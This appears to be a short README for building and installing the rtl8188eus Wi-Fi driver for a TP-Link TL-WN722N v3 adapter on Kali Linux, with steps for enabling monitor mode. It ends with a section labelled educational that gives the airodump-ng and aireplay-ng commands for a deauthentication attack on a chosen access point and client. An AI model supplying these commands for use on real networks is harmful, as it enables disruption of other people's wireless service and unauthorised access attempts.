# tp-link-v3-TL-WN722N
realtek-rtl8188eus-dkms packaging for Kali Linux



sudo apt install bc

sudo rmmod r8188eu.ko

git clone https://github.com/aircrack-ng/rtl8188eus

cd rtl8188eus

sudo -i

echo "blacklist r8188eu.ko" > "/etc/modprobe.d/realtek.conf"

exit

make

sudo make install

sudo modprobe 8188eu



To enable Monitor mode

ifconfig wlan0 down

airmon-ng check kill

iwconfig wlan0 mode monitor

ifconfig wlan0 up

iwconfig                                     \\check mode: monitor



Deauthentication Attack[for educational purpose only]



airodump-ng wlan0

airodump-ng --bssid <id> --channel <ch> --write test wlan0

aireplay-ng --deauth [any no.] -a <bssid> -c <station id> wlan0


Important note: 

If after restarting your kali machine doesn't recognise your device..
As lot of people are facing the same problem ..
I have a solution for you..
Whenever you restart your kali OS
Insert the adapter and run the command


sudo rmmod r8188eu.ko

Sudo modprobe 8188eu

Disconnect the device and connect again..
